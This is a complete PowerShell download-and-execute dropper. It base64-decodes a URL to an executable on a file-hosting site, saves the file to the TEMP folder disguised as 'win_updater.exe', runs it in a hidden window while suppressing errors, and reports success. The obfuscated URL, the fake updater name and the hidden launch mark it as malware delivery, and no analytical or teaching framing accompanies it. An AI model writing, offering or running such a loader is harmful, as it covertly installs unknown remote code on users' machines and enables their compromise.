$encoded_url = "aHR0cHM6Ly9zdG9yZS1uYS1waHgtNS5nb2ZpbGUuaW8vZG93bmxvYWQvd2ViLzMxNDRhMWY4LWE5N2EtNGQ0ZC05YzRmLTBiMDIwY2ViM2I4Ni9jbGllbnQuZXhl"
$d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded_url))
$p = Join-Path $env:TEMP "win_updater.exe"

Invoke-WebRequest -Uri $d -OutFile $p -UseBasicParsing -ErrorAction SilentlyContinue

if (Test-Path $p) {
    Start-Process -FilePath $p -WindowStyle Hidden -ErrorAction SilentlyContinue
    Write-Host "Success: Downloaded and Ran." -ForegroundColor Green
} else {
    Write-Host "Failed to process." -ForegroundColor Red
}
